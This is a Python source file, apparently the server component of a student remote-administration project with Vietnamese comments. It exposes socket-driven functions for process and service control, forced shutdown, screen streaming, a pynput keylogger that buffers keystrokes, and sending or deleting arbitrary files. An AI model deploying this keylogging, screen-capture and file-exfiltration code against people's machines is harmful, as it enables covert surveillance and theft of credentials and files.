import json
import os
import socket
import subprocess
import threading
from tkinter import messagebox
from pynput import keyboard
from vidstream import ScreenShareClient

class SV_Model:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.server_socket = None
        self.is_logging = False  # Trạng thái keylogger
        self.keys_buffer = ""  # Buffer lưu các phím nhấn
        self.listener = None

    def start_server(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.bind((self.server_ip, self.server_port))
            self.server_socket.listen(3)
            print(f"Server is listening on: {self.server_ip}:{self.server_port}")  #Để debugging
            return True
        except Exception as e:
            print(f"Error while starting server: {e}") #Để debugging
            return False

    def accept_client(self):
        try:
            self.client_socket, addr = self.server_socket.accept()
            return self.client_socket, addr
        except Exception as e:
            print(f"Error while accepting client: {e}") #Để debugging
            return None, None

    def close_server(self):
        if self.server_socket:
            self.server_socket.close()  # Đóng socket của server
            print("Server stopped.") #Để debugging
        self.server_socket = None  # Đảm bảo server_socket không còn giá trị sau khi dừng
        
    ##Class cho network
    def check_ip_address_valid(ip):
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
            return False
    
    def check_port_valid(port):
        if 0 < int(port) <= 65535:
            return True
        else:
            return False
        
    def send_command(self, socket, command):
        socket.sendall(command.encode())
    
    def send_command_utf8(self, socket, command):
        socket.sendall(command.encode('utf-8'))
    
    def receive_response(self, socket, buffer_size=65535):
        # self.clear_socket_buffer(socket) # xóa buffer cũ
        """Nhận phản hồi từ client"""
        return socket.recv(buffer_size).decode()
    
    # def clear_socket_buffer(self, socket):
    #     try:
    #         socket.setblocking(False)  # Tạm thời chuyển socket về non-blocking
    #         while True:
    #             _ = socket.recv(1024)  # Đọc và bỏ qua dữ liệu cũ trong buffer
    #     except BlockingIOError:
    #         pass  # Không còn dữ liệu trong buffer
    #     finally:
    #         socket.setblocking(True)  # Chuyển socket về blocking mode
    
    #1. SV_App_Process:    
    def list_apps_running(self):
        """Lấy danh sách ứng dụng đang chạy từ hệ thống"""
        try:
            # Lấy danh sách ứng dụng đang chạy từ hệ thống
            output = subprocess.check_output("tasklist", encoding='utf-8')  # Ensure UTF-8 encoding
            return output  # Trả lại kết quả cho controller
        except Exception as e:
            return str(e)  # Nếu có lỗi, trả về thông báo lỗi

    def start_app_by_name(self, app_name):
        """Khởi động ứng dụng theo tên"""
        try:
            # Sử dụng lệnh start để khởi động ứng dụng theo tên (có thể bao gồm đường dẫn nếu cần)
            subprocess.run(["start", app_name], check=True, shell=True)
            return f"Started application with name {app_name}."
        except Exception as e:
            return f"Error starting application with name {app_name}: {str(e)}"
    
    def stop_app_by_pid(self, pid):
        """Dừng ứng dụng theo PID"""
        try:
            subprocess.run(["taskkill", "/F", "/PID", str(pid)], check=True)
            return f"Stopped application with PID {pid}."
        except Exception as e:
            return f"Error stopping application with PID {pid}: {str(e)}" 
    
    def clear_tree(treeview):
        """Xóa tất cả các mục trong Treeview"""
        for item in treeview.get_children():
            treeview.delete(item)


    def run_powershell_command(self, command):
        try:
            result = subprocess.run(
                ["powershell", "-Command", command],
                check=True, capture_output=True, text=True
            )
            return result.stdout
        except subprocess.CalledProcessError as e:
            return e.stderr
        
    #---------------2. SV_Services:  -----------------------  
    def list_running_services(self):
        self.command = "Get-WmiObject Win32_Service | Where-Object { $_.State -eq 'Running' } | Select-Object -Property ProcessId, Name"
        return self.run_powershell_command(self.command)
    
    def start_service(self, service_name):
        self.command = f"Start-Process sc.exe -ArgumentList 'start', {service_name} -Verb runAs"
        return self.run_powershell_command(self.command)
    
    def stop_service_by_pid(self, pid):
        """Dừng dịch vụ theo PID"""
        try:
            subprocess.run(["taskkill", "/F", "/PID", str(pid)], check=True)
            return f"Stopped service with PID {pid}."
        except Exception as e:
            return f"Error stopping service with PID {pid}: {str(e)}" 
        
    def stop_service_by_name(self, service_name):
        self.command = f"Start-Process sc.exe -ArgumentList 'stop', {service_name} -Verb runAs"
        return self.run_powershell_command(self.command)


    #---------------3. SV_Shutdown: --------------------------  
    def shutdown_server(self):
        try:
            self.run_powershell_command("Stop-Computer -Force")
            return "Server is shutting down..."
        except Exception as e:
            return f"Khong the shutdown server: {e}"
    
    def reset_server(self):
        try:
            self.run_powershell_command("Restart-Computer -Force")
            return "Server is reset..."
        except Exception as e:
            return f"Khong the reset server: {e}"

    # ---------------- 4. SV_ScreenShare: ----------------------  
    def start_screen_sharing(self, client_ip, client_port):
        # Tạo đối tượng client chia sẻ màn hình và bắt đầu stream
        client_ip, client_port = self.read_config_client("sv_config.json")
        self.client_view_stream = ScreenShareClient(client_ip, client_port)
        self.stream_thread = threading.Thread(target=self.client_view_stream.start_stream)
        return self.client_view_stream, self.stream_thread
    
    def stop_screen_sharing(self):
        # Dừng việc chia sẻ màn hình
        if self.client_view_stream:
            self.client_view_stream.stop_stream()
            return "Screen sharing stopped."
        return "No screen sharing to stop."
    
    # Hàm kiểm tra sự tồn tại của file cấu hình
    def check_config_file(self, CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r"):
                return True
        except FileNotFoundError:
            return False

    # Hàm cập nhật cấu hình
    def update_config_server(self, CONFIG_FILE, server_ip=None, server_port=None, client_ip=None, client_port=None):
        if self.check_config_file(CONFIG_FILE):
            with open(CONFIG_FILE, "r") as file:
                config = json.load(file)
            
            # Cập nhật các giá trị mới nếu chúng được truyền vào
            if server_ip is not None:
                config["server_ip"] = server_ip
            if server_port is not None:
                config["server_port"] = server_port
            if client_ip is not None:
                config["client_ip"] = client_ip
            if client_port is not None:
                config["client_port"] = client_port            
            with open(CONFIG_FILE, "w") as file:
                json.dump(config, file, indent=4)
            # messagebox.showinfo("Cập nhật file cấu hình IP PORT", f"Cập nhật sv_config.json: Server IP = {config['server_ip']}, Server Port = {config['server_port']}, Client IP = {config['client_ip']}, Client Port = {config['client_port']}")
            print(f"Cập nhật sv_config.json: Server IP = {config['server_ip']}, Server Port = {config['server_port']}, Client IP = {config['client_ip']}, Client Port = {config['client_port']}") #Debugging
        else:
            messagebox.showerror("Lỗi file cấu hình IP PORT", "File sv_config.json không tồn tại.")

    # Hàm đọc cấu hình server từ file
    def read_config_server(self, CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as file:
                config = json.load(file)
            return config.get("server_ip"), config.get("server_port")
        except json.JSONDecodeError:
            messagebox.showerror("Lỗi file cấu hình IP PORT", "sv_config.json không hợp lệ. Vui lòng kiểm tra nội dung file.")
            return None, None
        except FileNotFoundError:
            messagebox.showerror("Lỗi file cấu hình IP PORT", "sv_config.json không tồn tại.")
            return None, None
        
    def read_config_client(self, CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as file:
                config = json.load(file)
            return config.get("client_ip"), config.get("client_port")
        except json.JSONDecodeError:
            messagebox.showerror("Lỗi file cấu hình IP PORT", "sv_config.json không hợp lệ. Vui lòng kiểm tra nội dung file.")
            return None, None
        except FileNotFoundError:
            messagebox.showerror("Lỗi file cấu hình IP PORT", "sv_config.json không tồn tại.")
            return None, None

    #---------------5. SV_Keylogger: ------------------   
    def start_keylogging(self):
        """Bắt đầu ghi phím."""
        if not self.is_logging:
            self.is_logging = True
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()  # Bắt đầu lắng nghe

    def stop_keylogging(self):
        """Dừng keylogger."""
        if self.is_logging:
            self.is_logging = False
            self.listener.stop()  # Dừng lắng nghe

    def on_press(self, key):
        """Xử lý khi một phím được nhấn."""
        try:
            # Dictionary chứa các phím đặc biệt và cách hiển thị của chúng
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: " [ENTER] ",
                keyboard.Key.tab: " [TAB] ",
                keyboard.Key.backspace: " [BACKSPACE] ",
            }
            # Kiểm tra nếu phím là ký tự bình thường
            if hasattr(key, 'char') and key.char is not None:
                key_str = key.char  # Lấy ký tự từ phím nhấn
            else:
                # Kiểm tra xem phím đặc biệt có trong dictionary không
                key_str = special_keys.get(key, f'[{str(key)}]')  # Tra cứu phím đặc biệt trong dictionary

            self.keys_buffer += key_str  # Thêm vào buffer
        except AttributeError:
            pass  # Nếu gặp lỗi (ví dụ: không phải phím có thuộc tính 'char'), bỏ qua

    def fetch_keylogger(self):
        """Trả về các phím đã ghi lại từ bộ đệm."""
        return self.keys_buffer

    def clear_keys(self):
        """Xóa bộ đệm phím."""
        self.keys_buffer = ""

    # ---------------- 6. Del_Delete File: ----------------------    
    def validate_file(self, file_path):
        if os.path.exists(file_path):
            return "TONTAI"
        return "KHONGTONTAI"
    
    def copy_file(self, client_socket, file_path):
        #Sao chép file tại đường dẫn được chỉ định trên server và gửi tới client.
        if os.path.exists(file_path):        
            # Lấy kích thước file
            file_size = os.path.getsize(file_path)
            
            # Gửi kích thước file đến client
            client_socket.sendall(file_size.to_bytes(4, byteorder='big'))
            
            # Gửi file tới client
            with open(file_path, 'rb') as f:
                while (chunk := f.read(4096)):
                    client_socket.sendall(chunk)
        else:
            # Nếu file không tồn tại, gửi kích thước 0 để báo lỗi
            client_socket.sendall((0).to_bytes(4, byteorder='big'))

    def delete_file(self, file_path):
        if not os.path.exists(file_path):
            return "ERROR|File does not exist."
        try:
            os.remove(file_path)
            return "SUCCESS|File deleted successfully."
        except Exception as e:
            return f"ERROR|{str(e)}"

            


    